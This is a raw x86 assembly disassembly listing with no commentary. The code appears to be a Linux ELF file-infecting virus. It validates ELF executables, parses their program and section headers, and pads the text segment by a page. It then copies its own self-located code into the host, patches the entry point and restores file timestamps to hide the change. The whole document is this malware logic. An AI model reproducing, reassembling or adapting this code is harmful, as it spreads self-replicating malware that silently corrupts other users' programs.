mov cl, byte [arg_ch]
xor eax, eax
cmp eax, edx
jge 0x8051608
nop
mov byte [eax + ebx], cl
inc eax
cmp eax, edx
jl 0x8051600
mov ebx, dword [var_4h]
leave
ret
push ebp
mov ebp, esp
push ebx
mov ebx, dword [arg_ch]
push dword [arg_10h]
push ebx
push dword [arg_8h]
push 0x13
call fcn.080514b4
cmp eax, ebx
jne 0x80515b0
mov eax, 1
jmp 0x80515b2
xor eax, eax
mov ebx, dword [var_4h]
leave
ret
push ebp
mov ebp, esp
push edi
push esi
push ebx
mov edi, dword [arg_8h]
mov esi, dword [arg_ch]
mov ebx, dword [arg_10h]
nop
push ebx
push esi
push edi
push 3
call fcn.080514b4
add esp, 0x10
cmp eax, ebx
jne 0x8051530
mov eax, 1
jmp 0x8051544
test eax, eax
jg 0x805153c
test ebx, ebx
jle 0x805153c
xor eax, eax
jmp 0x8051544
sub ebx, eax
add byte [esi], al
jmp 0x8051518
mov esi, esi
lea esp, [var_ch]
pop ebx
pop esi
pop edi
leave
ret
push ebp
mov ebp, esp
mov edx, dword [arg_8h]
cmp byte [edx], 0x7f
jne 0x805195c
cmp byte [edx + 1], 0x45
jne 0x805195c
cmp byte [edx + 2], 0x4c
jne 0x805195c
cmp byte [edx + 3], 0x46
jne 0x805195c
cmp word [edx + 0x10], 2
jne 0x805195c
mov ax, word [edx + 0x12]
cmp ax, 3
je 0x8051948
cmp ax, 6
jne 0x805195c
cmp dword [edx + 0x14], 1
jne 0x805195c
cmp word [edx + 0xa], 1
ja 0x805195c
mov eax, 1
jmp 0x805195e
xor eax, eax
leave
ret
push ebp
mov ebp, esp
sub esp, 0x100c
push edi
push esi
push ebx
mov eax, dword [arg_40h]
xor ebx, ebx
movzx edx, word [arg_38h]
cmp ebx, edx
jge 0x8051807
lea esi, [esi]
cmp dword [eax + 4], 0
jne 0x80517f8
cmp dword [eax], 1
jne 0x80517ff
mov esi, eax
jmp 0x80517ff
nop
cmp dword [eax], 1
jne 0x80517ff
mov ecx, eax
add eax, 0x20
inc ebx
cmp ebx, edx
jl 0x80517e8
mov edx, dword [esi + 8]
mov eax, edx
add eax, dword [esi + 0x10]
mov ecx, dword [ecx + 8]
sub ecx, eax
mov eax, ecx
cmp eax, 0xfff
jle 0x8051828
mov eax, 3
jmp 0x8051906
nop
mov eax, dword [arg_24h]
mov ecx, eax
sub ecx, edx
add ecx, dword [esi + 4]
add edx, dword [esi + 0x14]
sub edx, eax
lea eax, [edx - 1]
cmp eax, 0xfff
jbe 0x805184c
mov eax, 2
jmp 0x8051906
nop
cmp edx, 0x1000
ja 0x8051858
mov esi, edx
jmp 0x805185d
mov esi, 0x1000
push 0
push ecx
mov edi, dword [arg_8h]
push edi
call fcn.08051590
add esp, 0xc
test eax, eax
je 0x80518f5
push esi
lea edi, [var_1000h]
mov dword [var_100ch], edi
push edi
mov edi, dword [arg_8h]
push edi
call fcn.08051508
cmp eax, 1
jne 0x80518f5
xor ebx, ebx
lea eax, [esi - 4]
cmp ebx, eax
jge 0x80518f5
mov edi, dword [var_100ch]
mov dword [var_1008h], edi
mov dword [var_1004h], eax
nop
mov edi, dword [var_100ch]
mov esi, dword [edi]
mov edi, dword [var_1008h]
cmp byte [edi + ebx + 3], 0
je 0x80518e6
xor ecx, ecx
movzx edx, word [arg_3ch]
cmp ecx, edx
jge 0x80518e6
mov eax, edx
mov edx, dword [arg_44h]
add edx, 4
nop
cmp esi, dword [edx + 8]
jne 0x80518de
cmp dword [edx], 1
je 0x80518fc
add edx, 0x28
inc ecx
cmp ecx, eax
jl 0x80518d4
inc dword [var_100ch]
inc ebx
cmp ebx, dword [var_1004h]
jl 0x80518ac
mov eax, 0xffffffff
jmp 0x8051906
mov eax, dword [arg_48h]
mov dword [eax], esi
mov eax, 1
lea esp, [var_1018h]
pop ebx
pop esi
pop edi
leave
ret
push ebp
mov ebp, esp
push edi
push esi
push ebx
mov edi, dword [arg_8h]
mov esi, dword [arg_ch]
mov ebx, dword [arg_10h]
nop
push ebx
push esi
push edi
push 4
call fcn.080514b4
add esp, 0x10
cmp eax, ebx
jne 0x8051574
mov eax, 1
jmp 0x8051588
test eax, eax
jg 0x8051580
test ebx, ebx
jle 0x8051580
xor eax, eax
jmp 0x8051588
sub ebx, eax
add byte [esi], al
jmp 0x805155c
mov esi, esi
lea esp, [var_ch]
pop ebx
pop esi
pop edi
leave
ret
push ebp
mov ebp, esp
mov eax, 0xf86
leave
ret
push ebp
mov ebp, esp
jmp 0x8051469
pop eax
sub eax, 0x4e
jmp 0x805146e
call fcn.08051461
push ebp
mov ebp, esp
mov eax, 0x21
inc eax
leave
ret
push ebp
mov ebp, esp
sub esp, 4
push esi
push ebx
mov esi, dword [arg_8h]
xor ecx, ecx
test esi, esi
jg 0x8051668
mov eax, 1
jmp 0x8051689
mov ebx, 0x66666667
lea esi, [esi]
mov eax, esi
imul ebx
sar edx, 2
sar esi, 0x1f
mov dword [var_4h], esi
mov esi, edx
sub esi, dword [var_4h]
inc ecx
test esi, esi
jg 0x8051670
mov eax, ecx
lea esp, [var_ch]
pop ebx
pop esi
leave
ret
push ebp
mov ebp, esp
sub esp, 4
push edi
push esi
push ebx
mov ebx, dword [arg_8h]
mov edi, dword [arg_ch]
push ebx
call fcn.08051650
lea ecx, [eax - 1]
test ecx, ecx
jl 0x8052094
mov esi, 0x66666667
lea esi, [esi]
mov eax, ebx
imul esi
sar edx, 2
mov dword [var_4h], ebx
sar dword [var_4h], 0x1f
sub edx, dword [var_4h]
lea eax, [edx + edx*4]
add eax, eax
sub ebx, eax
mov dword [var_4h], ebx
mov ebx, edx
mov al, byte [var_4h]
add al, 0x30
mov byte [ecx + edi], al
dec ecx
jns 0x805206c
lea esp, [var_10h]
pop ebx
pop esi
pop edi
leave
ret
push ebp
mov ebp, esp
push esi
push ebx
mov ebx, dword [arg_8h]
push 0
push 0x2d
call fcn.08051488
mov esi, eax
add ebx, esi
push ebx
push 0x2d
call fcn.08051488
cmp eax, esi
je 0x80514fc
mov eax, esi
jmp 0x80514fe
lea esi, [esi]
xor eax, eax
lea esp, [var_8h]
pop ebx
pop esi
leave
ret
push ebp
mov ebp, esp
sub esp, 8
push edi
push esi
push ebx
xor esi, esi
mov dword [var_8h], 0
mov edi, dword [arg_8h]
mov al, byte [edi]
jmp 0x80516b3
lea esi, [esi]
inc esi
mov edi, dword [arg_8h]
mov al, byte [esi + edi]
add al, 0xd0
cmp al, 9
jbe 0x80516ac
xor ebx, ebx
cmp ebx, esi
jge 0x80516f2
lea edi, [esi - 1]
mov dword [var_4h], edi
lea esi, [esi]
mov edi, dword [arg_8h]
movsx eax, byte [ebx + edi]
add eax, 0xffffffd0
xor ecx, ecx
mov edx, dword [var_4h]
sub edx, ebx
cmp ecx, edx
jge 0x80516ea
lea esi, [esi]
lea eax, [eax + eax*4]
add eax, eax
inc ecx
cmp ecx, edx
jl 0x80516e0
add dword [var_8h], eax
inc ebx
cmp ebx, esi
jl 0x80516c8
mov eax, dword [var_8h]
lea esp, [var_14h]
pop ebx
pop esi
pop edi
leave
ret
push ebp
mov ebp, esp
mov edx, dword [arg_8h]
xor eax, eax
cmp byte [edx], 0
je 0x8051627
lea esi, [esi]
inc edx
inc eax
cmp byte [edx], 0
jne 0x8051620
leave
ret
push ebp
mov ebp, esp
sub esp, 0xf8
push edi
push esi
push ebx
lea eax, [var_b4h]
push eax
mov ecx, dword [arg_8h]
push ecx
push 0x6a
call fcn.0805149c
add esp, 0xc
test eax, eax
jl 0x8052035
mov eax, dword [var_94h]
mov dword [var_bch], eax
mov eax, dword [var_8ch]
lea ecx, [var_bch]
mov dword [var_ech], ecx
mov dword [ecx + 4], eax
push 0
push 2
mov ecx, dword [arg_8h]
push ecx
push 5
call fcn.080514b4
mov dword [var_c4h], eax
add esp, 0x10
test eax, eax
jl 0x805201e
push 0x34
lea ecx, [var_74h]
mov dword [var_f4h], ecx
mov dword [var_c8h], ecx
push ecx
mov ecx, dword [var_c4h]
push ecx
call fcn.08051508
add esp, 0xc
test eax, eax
je 0x805201e
mov ecx, dword [var_f4h]
push ecx
call fcn.08051914
add esp, 4
test eax, eax
je 0x805201e
mov dword [var_cch], esp
movzx edi, word [var_48h]
movzx eax, word [var_44h]
mov dword [var_d0h], edi
shl dword [var_d0h], 5
sub esp, dword [var_d0h]
mov dword [var_d4h], esp
xor ebx, ebx
mov dword [var_d8h], 0
lea eax, [eax + eax*4]
shl eax, 3
mov dword [var_e4h], eax
sub esp, eax
mov dword [var_e8h], esp
push 0
push dword [var_58h]
mov ecx, dword [var_c4h_2]
push ecx
call fcn.08051590
add esp, 0xc
test eax, eax
je 0x8052018
mov ecx, dword [var_d0h]
push ecx
mov ecx, dword [var_d4h]
push ecx
mov ecx, dword [var_c4h_2]
push ecx
call fcn.08051508
add esp, 0xc
test eax, eax
je 0x8052018
push 0
push dword [var_54h]
mov ecx, dword [var_c4h_2]
push ecx
call fcn.08051590
add esp, 0xc
test eax, eax
je 0x8052018
mov ecx, dword [var_e4h]
push ecx
mov ecx, dword [var_e8h]
push ecx
mov ecx, dword [var_c4h_2]
push ecx
call fcn.08051508
add esp, 0xc
test eax, eax
je 0x8052018
mov dword [var_f8h], 0
cmp ebx, edi
jge 0x8051b23
mov esi, dword [var_d4h]
add esi, 4
mov eax, dword [var_d4h]
xor edx, edx
mov esi, esi
cmp dword [esi + edx], 0
jne 0x8051b04
cmp dword [eax], 1
jne 0x8051b0f
mov ebx, eax
jmp 0x8051b0f
nop
cmp dword [eax], 1
jne 0x8051b0f
mov dword [var_d8h], eax
add eax, 0x20
add edx, 0x20
inc dword [var_f8h]
cmp dword [var_f8h], edi
jl 0x8051af4
test ebx, ebx
je 0x8052018
cmp dword [var_d8h], 0
je 0x8052018
mov ecx, dword [ebx + 0x10]
mov dword [var_dch], ecx
mov ecx, dword [ebx + 4]
add dword [var_dch], ecx
mov ecx, dword [ebx + 0x14]
mov dword [var_e0h], ecx
mov ecx, dword [ebx + 8]
add dword [var_e0h], ecx
lea ecx, [var_c0h]
mov dword [var_f0h], ecx
push ecx
mov ecx, dword [var_e8h]
push ecx
mov ecx, dword [var_d4h]
push ecx
add esp, 0xffffffcc
mov edi, esp
mov esi, dword [var_c8h_2]
cld
mov ecx, 0xd
rep movsd dword es:[edi], dword ptr [esi]
mov ecx, dword [var_c4h_2]
push ecx
call fcn.080517cc
add esp, 0x44
cmp eax, 1
je 0x8051e78
jle 0x8052018
cmp eax, 2
je 0x8051ed4
cmp eax, 3
jne 0x8052018
mov dword [var_f8h], 0
cmp word [var_48h], 0
je 0x8051c33
mov ebx, dword [var_d4h]
add ebx, 0x14
mov esi, dword [var_d4h]
add esi, 0x10
mov edx, dword [var_d4h]
add edx, 4
xor edi, edi
mov eax, dword [edx]
cmp eax, dword [var_dch]
jb 0x8051bf9
add eax, 0x1000
mov dword [edx], eax
test eax, eax
jne 0x8051c15
mov ecx, dword [var_d4h]
cmp dword [ecx + edi], 1
jne 0x8051c15
add dword [esi], 0x1000
add dword [ebx], 0x1000
add ebx, 0x20
add esi, 0x20
add edx, 0x20
add edi, 0x20
inc dword [var_f8h]
movzx eax, word [var_48h]
cmp dword [var_f8h], eax
jl 0x8051be8
mov dword [var_f8h], 0
movzx esi, word [var_44h]
cmp dword [var_f8h], esi
jge 0x8051c7a
mov edx, dword [var_e8h]
add edx, 0x10
mov esi, esi
mov eax, dword [edx]
cmp eax, dword [var_dch]
jbe 0x8051c69
add eax, 0x1000
mov dword [edx], eax
movzx esi, word [var_44h]
add edx, 0x28
inc dword [var_f8h]
cmp dword [var_f8h], esi
jl 0x8051c54
push 0
push dword [var_58h]
mov ecx, dword [var_c4h_2]
push ecx
call fcn.08051590
add esp, 0xc
test eax, eax
je 0x8052018
mov ecx, dword [var_d0h]
push ecx
mov ecx, dword [var_d4h]
push ecx
mov ecx, dword [var_c4h_2]
push ecx
call fcn.0805154c
add esp, 0xc
cmp eax, 1
jne 0x8052018
push 0
push dword [var_54h]
mov ecx, dword [var_c4h_2]
push ecx
call fcn.08051590
add esp, 0xc
test eax, eax
je 0x8052018
mov ecx, dword [var_e4h]
push ecx
mov ecx, dword [var_e8h]
push ecx
mov ecx, dword [var_c4h_2]
push ecx
call fcn.0805154c
add esp, 0xc
cmp eax, 1
jne 0x8052018
mov edi, esp
mov ebx, dword [var_a0h]
sub ebx, dword [var_dch]
mov eax, ebx
and eax, 0x1fffffff
add eax, 3
and eax, 0x3ffffffc
sub esp, eax
mov esi, esp
push 0
mov ecx, dword [var_dch]
push ecx
mov ecx, dword [var_c4h_2]
push ecx
call fcn.08051590
add esp, 0xc
test eax, eax
je 0x8052018
push ebx
push esi
mov ecx, dword [var_c4h_2]
push ecx
call fcn.08051508
add esp, 0xc
cmp eax, 1
jne 0x8052018
push 0
mov eax, dword [var_dch]
add eax, 0x1000
push eax
mov ecx, dword [var_c4h_2]
push ecx
call fcn.08051590
add esp, 0xc
test eax, eax
je 0x8052018
push ebx
push esi
mov ecx, dword [var_c4h_2]
push ecx
call fcn.0805154c
cmp eax, 1
jne 0x8052018
mov esp, edi
push 0
mov ecx, dword [var_dch]
push ecx
mov ecx, dword [var_c4h_2]
push ecx
call fcn.08051590
add esp, 0xc
test eax, eax
je 0x8052018
call fcn.08051470
push eax
call fcn.0805145c
push eax
mov ecx, dword [var_c4h_2]
push ecx
call fcn.0805154c
add esp, 0xc
cmp eax, 1
jne 0x8052018
push 0
call fcn.08051450
add eax, dword [var_dch]
push eax
mov ecx, dword [var_c4h_2]
push ecx
call fcn.08051590
add esp, 0xc
test eax, eax
je 0x8052018
push 4
lea eax, [var_5ch]
push eax
mov ecx, dword [var_c4h_2]
push ecx
call fcn.0805154c
add esp, 0xc
cmp eax, 1
jne 0x8052018
mov word [var_6ah], 2
mov ecx, dword [var_a0h]
add ecx, 0x1000
mov dword [var_68h], ecx
mov ecx, dword [var_e0h]
mov dword [var_5ch], ecx
mov eax, dword [var_54h]
cmp eax, dword [var_dch]
jb 0x8051e4f
add eax, 0x1000
mov dword [var_54h], eax
push 0
push 0
mov ecx, dword [var_c4h_2]
push ecx
call fcn.08051590
add esp, 0xc
test eax, eax
je 0x8052018
push 0x34
mov ecx, dword [var_f4h_2]
jmp 0x8051fa6
nop
mov eax, dword [ebx + 0x10]
add eax, dword [ebx + 4]
lea esi, [eax - 0x1000]
cmp word [var_6ah], 1
ja 0x8052013
mov eax, dword [ebx + 0x14]
add eax, dword [ebx + 8]
add eax, 0xfffff000
mov dword [var_5ch], eax
mov word [var_6ah], 2
mov eax, dword [var_a0h]
mov dword [var_68h], eax
push 0
push 0
mov ecx, dword [var_c4h_2]
push ecx
call fcn.08051590
add esp, 0xc
test eax, eax
je 0x8052018
push 0x34
mov ecx, dword [var_c8h_2]
jmp 0x8051f2a
lea esi, [esi]
mov eax, dword [ebx + 0x10]
add eax, dword [ebx + 4]
lea esi, [eax - 0x1000]
mov edx, dword [ebx + 0x14]
add edx, dword [ebx + 8]
mov eax, dword [var_5ch]
mov dword [var_c0h], eax
mov word [var_6ah], 2
mov eax, dword [var_a0h]
mov dword [var_68h], eax
add edx, 0xfffff000
mov dword [var_5ch], edx
push 0
push 0
mov ecx, dword [var_c4h_2]
push ecx
call fcn.08051590
add esp, 0xc
test eax, eax
je 0x8052018
push 0x34
mov ecx, dword [var_f4h_2]
push ecx
mov ecx, dword [var_c4h_2]
push ecx
call fcn.0805154c
add esp, 0xc
cmp eax, 1
jne 0x8052018
push 0
push esi
mov ecx, dword [var_c4h_2]
push ecx
call fcn.08051590
add esp, 0xc
test eax, eax
je 0x8052018
call fcn.08051470
push eax
call fcn.0805145c
push eax
mov ecx, dword [var_c4h_2]
push ecx
call fcn.0805154c
add esp, 0xc
cmp eax, 1
jne 0x8052018
push 0
call fcn.08051450
add eax, esi
push eax
mov ecx, dword [var_c4h_2]
push ecx
call fcn.08051590
add esp, 0xc
test eax, eax
je 0x8052018
push 4
mov ecx, dword [var_f0h]
push ecx
mov ecx, dword [var_c4h_2]
push ecx
call fcn.0805154c
add esp, 0xc
cmp eax, 1
jne 0x8052018
push 0
push dword [var_68h]
mov ecx, dword [var_c4h_2]
push ecx
call fcn.08051590
add esp, 0xc
test eax, eax
je 0x8052018
mov ecx, dword [var_f4h]
push ecx
mov ecx, dword [var_ch]
push ecx
mov ecx, dword [var_c4h_2]
push ecx
call fcn.0805154c
add esp, 0xc
cmp eax, 1
jne 0x8052018
mov ecx, dword [var_c4h_2]
push ecx
push 6
call fcn.08051488
mov ecx, dword [var_ech_2]
push ecx
mov ecx, dword [var_8h]
push ecx
push 0x1e
call fcn.0805149c
test eax, eax
jl 0x8052018
xor eax, eax
jmp 0x805203a
nop
mov esp, dword [var_cch_2]
cmp dword [var_c4h], 0xffffffff
je 0x8052035
mov ecx, dword [var_c4h]
push ecx
push 6
call fcn.08051488
mov eax, 0xffffffff
lea esp, [var_104h]
pop ebx
pop esi
pop edi
leave
ret
push ebp
mov ebp, esp
push esi
push ebx
mov esi, dword [arg_8h]
mov ebx, dword [arg_ch]
mov ecx, dword [arg_10h]
xor edx, edx
cmp edx, ecx
jge 0x80515dd
mov al, byte [edx + ebx]
cmp byte [edx + esi], al
je 0x80515d8
xor eax, eax
jmp 0x80515e2
inc edx
cmp edx, ecx
jl 0x80515cc
mov eax, 1
lea esp, [var_8h]
pop ebx
pop esi
leave
ret
push ebp
mov ebp, esp
push ebx
mov edx, dword [arg_10h]
mov ebx, dword [arg_8h]
mov ecx, dword [arg_ch]
test edx, edx
jle 0x805164b
lea esi, [esi]
mov al, byte [ecx]
mov byte [ebx], al
inc ebx
inc ecx
dec edx
test edx, edx
jg 0x8051640
mov ebx, dword [var_4h]
leave
ret
